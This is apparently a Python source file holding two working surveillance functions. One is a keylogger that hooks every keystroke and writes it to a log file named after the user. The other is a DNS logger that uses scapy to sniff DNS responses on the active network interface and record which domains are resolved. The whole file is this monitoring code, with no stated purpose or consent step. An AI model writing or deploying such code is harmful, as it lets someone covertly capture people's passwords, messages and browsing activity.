from utilities import current_time, user_name, active_interface
import logging
import keyboard
import scapy.all as scapy

#key logger
def key_logger():
    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', 
                        format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # define a callback function to process the keystrokes
    def on_key_press(event):
        # get the name of the pressed key
        key = event.name
        # write the keystroke to the log file
        logging.info(key)
    # hook the keyboard events with the callback function
    keyboard.on_press(on_key_press)
    # start the hook and keep the script running
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        exit(0)

#dns logger
def dns_logger():
    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO, filemode='a', 
                        format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # Define a function to process each packet
    def process_packet(packet):
        # Check if the packet has a DNS resource record layer
        if packet.haslayer(scapy.DNSRR):
            # Get the record name and data from the packet
            rrname = packet[scapy.DNSRR].rrname.decode('utf-8')
            rdata = packet[scapy.DNSRR].rdata
            rtype = packet[scapy.DNSRR].type
            # Decode the record data from bytes to a string if necessary
            if isinstance(rdata, bytes):
                rdata = rdata.decode('utf-8')
            # Log the record based on its type
            if rtype == 1:
                logging.info(f'A record: {rrname} -> {rdata}')
            elif rtype == 28:
                logging.info(f'AAAA record: {rrname} -> {rdata}')
            elif rtype == 5:
                logging.info(f'CNAME record: {rrname} -> {rdata}')
            elif rtype == 15:
                logging.info(f'MX record: {rrname} -> {rdata}')
            elif rtype == 2:
                logging.info(f'NS record: {rrname} -> {rdata}')
    # Start sniffing packets on the active network interface
    scapy.sniff(iface=active_interface(), prn=process_packet, store=False)